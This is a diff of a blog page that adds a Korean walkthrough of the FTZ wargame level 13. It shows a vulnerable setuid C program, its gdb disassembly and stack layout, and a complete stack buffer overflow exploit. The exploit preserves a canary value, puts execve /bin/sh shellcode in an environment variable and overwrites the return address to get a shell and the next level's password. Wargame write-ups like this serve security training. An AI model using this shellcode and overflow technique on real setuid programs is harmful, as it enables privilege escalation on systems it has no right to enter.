@@ -6,13 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="Level 13Description12345678910111213141516#include &lt;stdlib.h&gt;main(int argc, char *argv[])&#123;	long i&#x3D;0x1234567;	char buf[1024];	setreuid( 3094, 3094 );	if(argc &gt; 1)	strcpy(buf,argv[1]);	if(">
+<meta property="og:type" content="article">
 <meta property="og:title" content="FTZ : level 13">
 <meta property="og:url" content="https://bintab1e.github.io/2024/09/21/ftz/FTZ-level-13/index.html">
 <meta property="og:site_name" content="bintab1e">
+<meta property="og:description" content="Level 13Description12345678910111213141516#include &lt;stdlib.h&gt;main(int argc, char *argv[])&#123;	long i&#x3D;0x1234567;	char buf[1024];	setreuid( 3094, 3094 );	if(argc &gt; 1)	strcpy(buf,argv[1]);	if(">
 <meta property="og:locale" content="ko_KR">
 <meta property="article:published_time" content="2024-09-21T11:37:31.000Z">
-<meta property="article:modified_time" content="2024-10-06T11:39:37.760Z">
+<meta property="article:modified_time" content="2024-10-06T12:35:57.886Z">
 <meta property="article:author" content="bintab1e">
 <meta property="article:tag" content="ftz">
 <meta name="twitter:card" content="summary">
@@ -112,6 +114,10 @@
     </div>
     
     
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">1.</span> <span class="toc-text">Level 13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
   </span>
 </div>
 
@@ -159,7 +165,21 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    
+    <h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> i=<span class="number">0x1234567</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">	setreuid( <span class="number">3094</span>, <span class="number">3094</span> );</span><br><span class="line">	<span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(i != <span class="number">0x1234567</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Warnning: Buffer Overflow !!! \n&quot;</span>);</span><br><span class="line">		kill(<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+<p>버퍼는 1024바이트를 입력받을 수 있으나, strcpy 함수에서 버퍼의 크기보다 더 많이 받을 수 있어 bof가 발생한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i != <span class="number">0x1234567</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">	kill(<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>중요한 점은 덮는 과정에서 i 변수는 0x1234567로 값이 고정된채로 exploit을 수행해야 한다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[level13@ftz tmp]$ gdb -q attackme</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x080483c8 &lt;main+0&gt;:    push   ebp</span><br><span class="line">0x080483c9 &lt;main+1&gt;:    mov    ebp,esp</span><br><span class="line">0x080483cb &lt;main+3&gt;:    sub    esp,0x418</span><br><span class="line">0x080483d1 &lt;main+9&gt;:    and    esp,0xfffffff0</span><br><span class="line">0x080483d4 &lt;main+12&gt;:   mov    eax,0x0</span><br><span class="line">0x080483d9 &lt;main+17&gt;:   sub    esp,eax</span><br><span class="line">0x080483db &lt;main+19&gt;:   mov    DWORD PTR [ebp-12],0x1234567</span><br><span class="line">0x080483e2 &lt;main+26&gt;:   sub    esp,0x8</span><br><span class="line">0x080483e5 &lt;main+29&gt;:   push   0xc16</span><br><span class="line">0x080483ea &lt;main+34&gt;:   push   0xc16</span><br><span class="line">0x080483ef &lt;main+39&gt;:   call   0x80482e8 &lt;setreuid&gt;</span><br><span class="line">0x080483f4 &lt;main+44&gt;:   add    esp,0x10</span><br><span class="line">0x080483f7 &lt;main+47&gt;:   cmp    DWORD PTR [ebp+8],0x1</span><br><span class="line">0x080483fb &lt;main+51&gt;:   jle    0x8048417 &lt;main+79&gt;</span><br><span class="line">0x080483fd &lt;main+53&gt;:   sub    esp,0x8</span><br><span class="line">0x08048400 &lt;main+56&gt;:   mov    eax,DWORD PTR [ebp+12]</span><br><span class="line">0x08048403 &lt;main+59&gt;:   add    eax,0x4</span><br><span class="line">0x08048406 &lt;main+62&gt;:   push   DWORD PTR [eax]</span><br><span class="line">0x08048408 &lt;main+64&gt;:   lea    eax,[ebp-1048]</span><br><span class="line">0x0804840e &lt;main+70&gt;:   push   eax</span><br><span class="line">0x0804840f &lt;main+71&gt;:   call   0x8048308 &lt;strcpy&gt;</span><br></pre></td></tr></table></figure>
+<p>main+64 부분을 보면 ebp-1048을 보면 buf(1024) + dummy(12) + i(4) + dummy(8) + sfp(4) + ret(4)의 구조를 가지는 것을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;print&quot;\x90&quot;*1036+&quot;\x67\x45\x23\x01&quot;+&quot;A&quot;*12+&quot;Return address&quot;&#x27;</span><br></pre></td></tr></table></figure>
+<p>위처럼 작성하면 i 변수의 값을 건들지 않고 나머지 메모리를 덮을 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[level13@ftz tmp]$ export EGG=`python -c &#x27;print&quot;\x90&quot;*15+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#x27;`</span><br><span class="line">[level13@ftz tmp]$ echo &#x27;int main() &#123;printf(&quot;0x%x\n&quot;, getenv(&quot;EGG&quot;));&#125;&#x27; &gt; test.c</span><br><span class="line">[level13@ftz tmp]$ gcc test.c -o test</span><br><span class="line">[level13@ftz tmp]$ ./test</span><br><span class="line">0xbffffc8f</span><br></pre></td></tr></table></figure>
+<p>이 전처럼 환경변수에 쉘코드를 담고, 해당 환경변수의 위치를 찾는다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[level13@ftz level13]$ ./attackme `python -c &#x27;print&quot;\x90&quot;*1036+&quot;\x67\x45\x23\x01&quot;+&quot;\x90&quot;*12+&quot;\x8f\xfc\xff\xbf&quot;&#x27;`</span><br><span class="line">sh-2.05b$ my-pass</span><br><span class="line">TERM environment variable not set.</span><br><span class="line"></span><br><span class="line">Level14 Password is &quot;what that nigga want?&quot;.</span><br></pre></td></tr></table></figure>
+<p>환경변수의 위치를 return address에 삽입하여 쉘을 획득 !</p>
+
   </div>
 </article>
 
@@ -185,6 +205,10 @@
 
     
     
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">1.</span> <span class="toc-text">Level 13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -205,6 +229,8 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
